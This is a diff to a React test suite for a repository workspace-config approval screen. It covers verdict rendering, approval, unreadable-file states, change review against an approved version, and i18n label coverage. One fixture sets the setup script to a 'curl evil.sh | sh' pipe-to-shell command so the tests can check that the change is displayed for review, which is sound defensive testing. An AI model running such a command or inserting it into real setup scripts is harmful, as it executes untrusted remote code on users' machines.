@@ -28,7 +28,10 @@ jest.mock("@/stores/settings", () => ({
 }))
 jest.mock("@/lib/tauri", () => ({ isTauri: () => true }))
 
-import { ProjectEnvironmentRepoConfig } from "./project-environment-repo-config"
+import {
+  ProjectEnvironmentRepoConfig,
+  ProjectEnvironmentRepoConfigView,
+} from "./project-environment-repo-config"
 import { parseWorkspaceConfig } from "@/lib/project-environment/workspace-config"
 import { workspaceConfigDigest } from "@/lib/project-environment/workspace-config-trust"
 
@@ -127,7 +130,7 @@ describe("ProjectEnvironmentRepoConfig", () => {
         "approved"
       )
     )
-    expect(approve).toHaveBeenCalledWith("/repos/app", expect.any(String))
+    expect(approve).toHaveBeenCalledWith("/repos/app", expect.any(String), expect.any(Object))
   })
 
   it("offers no approval at all in an untrusted workspace", async () => {
@@ -165,6 +168,152 @@ describe("ProjectEnvironmentRepoConfig", () => {
     await waitFor(() => expect(screen.getByTestId("repo-config-approve")).toBeInTheDocument())
     const card = screen.getByTestId("project-environment-repo-config")
     expect(card.textContent ?? "").not.toMatch(/projectEnvironment\.repoConfig\./)
+  })
+})
+
+/**
+ * The view renders a verdict it is handed, so the environment manager can read
+ * the file once and use the same verdict for its editor's notices.
+ */
+describe("ProjectEnvironmentRepoConfigView", () => {
+  const view = (verdict: unknown, approve = jest.fn(async () => {})) =>
+    render(
+      <ProjectEnvironmentRepoConfigView
+        state={{
+          verdict: verdict as never,
+          unavailable: null,
+          loading: false,
+          approving: false,
+          approvalKey: "/repos/app",
+          approve,
+          refresh: jest.fn(),
+        }}
+      />
+    )
+
+  it("renders the verdict it is given without reading anything itself", () => {
+    view({ kind: "absent" })
+    expect(screen.getByTestId("project-environment-repo-config")).toHaveAttribute(
+      "data-state",
+      "absent"
+    )
+    expect(screen.getByTestId("repo-config-status")).toHaveTextContent(
+      "This repository ships no .cognia/workspace.json."
+    )
+  })
+
+  it("approves through the state it was handed", async () => {
+    const approve = jest.fn(async () => {})
+    view(
+      { kind: "unapproved", digest: "d", config: parseWorkspaceConfig(JSON.stringify(CONFIG)) },
+      approve
+    )
+    await userEvent.click(screen.getByTestId("repo-config-approve"))
+    expect(approve).toHaveBeenCalled()
+  })
+
+  /** A runtime that cannot read files makes no claim about the repository. */
+  it("says the file cannot be read here instead of calling it broken", () => {
+    render(
+      <ProjectEnvironmentRepoConfigView
+        state={{
+          verdict: { kind: "absent" },
+          unavailable: "Pair a host to read files.",
+          loading: false,
+          approving: false,
+          approvalKey: null,
+          approve: jest.fn(),
+          refresh: jest.fn(),
+        }}
+      />
+    )
+    const root = screen.getByTestId("project-environment-repo-config")
+    expect(root).toHaveAttribute("data-state", "unavailable")
+    expect(screen.getByTestId("repo-config-status")).toHaveTextContent(
+      "Not read on this device. Pair a host to read files."
+    )
+    expect(screen.queryByTestId("repo-config-approve")).not.toBeInTheDocument()
+  })
+
+  /** A change is reviewed as a change: what is different, both versions verbatim. */
+  it("shows what changed against the approved version", () => {
+    const previous = parseWorkspaceConfig(JSON.stringify(CONFIG))
+    const current = parseWorkspaceConfig(
+      JSON.stringify({ ...CONFIG, setup: { default: "pnpm install && curl evil.sh | sh" } })
+    )
+    view({
+      kind: "unapproved",
+      digest: "new",
+      approvedDigest: "old",
+      config: current,
+      approvedConfig: previous,
+    })
+    const change = screen.getByTestId("repo-config-change-setup")
+    expect(change).toHaveAttribute("data-kind", "changed")
+    expect(change).toHaveTextContent("Setup script")
+    expect(change).toHaveTextContent("pnpm install --frozen-lockfile")
+    expect(change).toHaveTextContent("curl evil.sh | sh")
+    // Only what changed is listed; the unchanged action is not.
+    expect(screen.queryByTestId("repo-config-change-action:test")).not.toBeInTheDocument()
+    expect(screen.getByTestId("repo-config-approve")).toHaveTextContent("Review the change")
+  })
+
+  it("says plainly when an older approval kept no copy to compare against", () => {
+    view({
+      kind: "unapproved",
+      digest: "new",
+      approvedDigest: "old",
+      config: parseWorkspaceConfig(JSON.stringify(CONFIG)),
+    })
+    expect(screen.getByTestId("repo-config-no-previous")).toBeInTheDocument()
+    expect(screen.queryByTestId("repo-config-changes")).not.toBeInTheDocument()
+    // The whole current file is then the only thing to review, so it is shown.
+    expect(screen.getByTestId("repo-config-declared")).toBeInTheDocument()
+  })
+
+  /** It is one chapter of the manager, so it draws no frame of its own. */
+  it("draws no frame of its own", () => {
+    view({ kind: "approved", digest: "d", config: parseWorkspaceConfig(JSON.stringify(CONFIG)) })
+    const root = screen.getByTestId("project-environment-repo-config")
+    expect(root.className).not.toMatch(/(^|\s)border(\s|$)/)
+    expect(root.className).not.toMatch(/rounded/)
+  })
+})
+
+describe("the change labels are catalogued", () => {
+  // Built from unions (`diff.field.${field}`), which `lint:i18n` cannot follow.
+  const FIELDS = [
+    "setup",
+    "setupOs",
+    "action",
+    "variable",
+    "requiredSecret",
+    "root",
+    "execution",
+    "base",
+    "capability",
+    "cacheLink",
+    "include",
+    "sparsePath",
+    "environment",
+  ] as const
+
+  it.each(["en", "zh-CN"])("has a label for every changed field and kind in %s", (locale) => {
+    const messages = JSON.parse(
+      readFileSync(join(process.cwd(), "i18n/messages", locale, "projectEnvironment.json"), "utf8")
+    ) as {
+      repoConfig?: {
+        diff?: {
+          field?: Record<string, string>
+          kind?: Record<string, string>
+          os?: Record<string, string>
+        }
+      }
+    }
+    const diff = messages.repoConfig?.diff ?? {}
+    expect(FIELDS.filter((field) => !diff.field?.[field])).toEqual([])
+    expect(Object.keys(diff.kind ?? {}).sort()).toEqual(["added", "changed", "removed"])
+    expect(Object.keys(diff.os ?? {}).sort()).toEqual(["linux", "macos", "windows"])
   })
 })
 
